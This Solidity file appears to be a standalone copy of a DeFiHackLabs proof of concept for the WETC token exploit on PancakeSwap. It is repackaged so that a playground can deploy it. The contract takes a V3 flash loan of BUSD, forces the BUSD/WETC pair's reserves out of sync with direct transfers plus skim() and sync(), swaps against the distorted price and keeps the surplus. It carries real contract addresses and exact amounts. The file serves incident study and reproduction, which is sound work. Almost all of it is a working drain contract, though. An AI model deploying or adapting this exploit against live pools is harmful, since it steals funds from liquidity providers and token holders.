// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-07-WETC_Token).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (WETC extends BaseTestWithBalanceLog and IS the flash-loan/flash-swap
// recipient — pancakeV3FlashCallback and pancakeCall live on the test itself,
// via `address(this)`), so there is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> pancakeV3FlashCallback -> pancakeCall) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/WETC_Token_exp.sol.
//
// Root cause: the BUSD/WETC PancakeSwap V2 pair's reserves can be desynced
// from its real token balances by directly transferring WETC to the pair and
// calling skim()+sync(); the attacker uses a PancakeSwap V3 flash loan of
// BUSD to fund a small flash-swap, then inflates+resyncs the pair's reserves
// twice via skim/sync, then swaps the manipulated pair for a large amount of
// BUSD — netting far more BUSD than the flash loan + fee that must be repaid.

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract WETCDrain {
    address constant busd_wetc_cakeLP = 0x8e2cc521b12dEBA9A20EdeA829c6493410dAD0E3;
    address constant pancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address constant wetc = 0xE7f12B72bfD6E83c237318b89512B418e7f6d7A7;
    address constant busd = 0x55d398326f99059fF775485246999027B3197955;

    uint256 constant borrowAmount = 1000000000000000000000000;

    // The exploit begins by taking a large flash loan of BUSD from a PancakeSwap V3 pool.
    function run() external {
        IPancakeV3Pool(pancakeV3Pool).flash(address(this), borrowAmount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
        // The core of the exploit involves manipulating the reserves of the BUSD/WETC PancakeSwap V2 pool.
        // 1. A small initial swap is performed.
        IPancakePair(busd_wetc_cakeLP).swap(1000, 6994607918395778704138079, address(this), "0x00");

        // 2. Large amounts of WETC are directly transferred to the LP pair contract.
        // The `skim` function is then called. `skim` is designed to collect excess tokens sent to the pair contract.
        // By sending tokens and then calling skim, the attacker forces the pool's internal reserves out of sync with its actual token balances.
        IERC20(wetc).transfer(address(busd_wetc_cakeLP), 3533285263192068394666304);
        IPancakePair(busd_wetc_cakeLP).skim(0xB213171c9a803997B44842d0361e742e1E6691fc);
        // `sync` is called to update the reserves to the now-inflated token balances, distorting the price.
        IPancakePair(busd_wetc_cakeLP).sync();

        // This process is repeated to further manipulate the reserves.
        IERC20(wetc).transfer(address(busd_wetc_cakeLP), 27354466553745045636126);
        IPancakePair(busd_wetc_cakeLP).skim(0xB213171c9a803997B44842d0361e742e1E6691fc);
        IPancakePair(busd_wetc_cakeLP).sync();

        // 3. Small amounts of BUSD and more WETC are transferred in.
        IERC20(busd).transfer(address(busd_wetc_cakeLP), 10000);
        IERC20(wetc).transfer(address(busd_wetc_cakeLP), 3433968188649965263835649);

        // 4. With the price heavily manipulated, the attacker swaps the remaining assets for a large amount of BUSD.
        IPancakePair(busd_wetc_cakeLP).swap(351495403570120114936199, 0, address(this), "");

        // 5. The flash loan is repaid with the required fee. The remaining BUSD is the profit.
        uint256 repayAmount = borrowAmount + fee0;
        IERC20(busd).transfer(address(pancakeV3Pool), repayAmount);
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) public {
        // This function is called by the PancakeSwap pair during the first swap.
        // The attacker uses this callback to send the flash-loaned BUSD to the pair to cover the swap input.
        IERC20(busd).transfer(address(busd_wetc_cakeLP), 250000000000000000002000);
    }
}
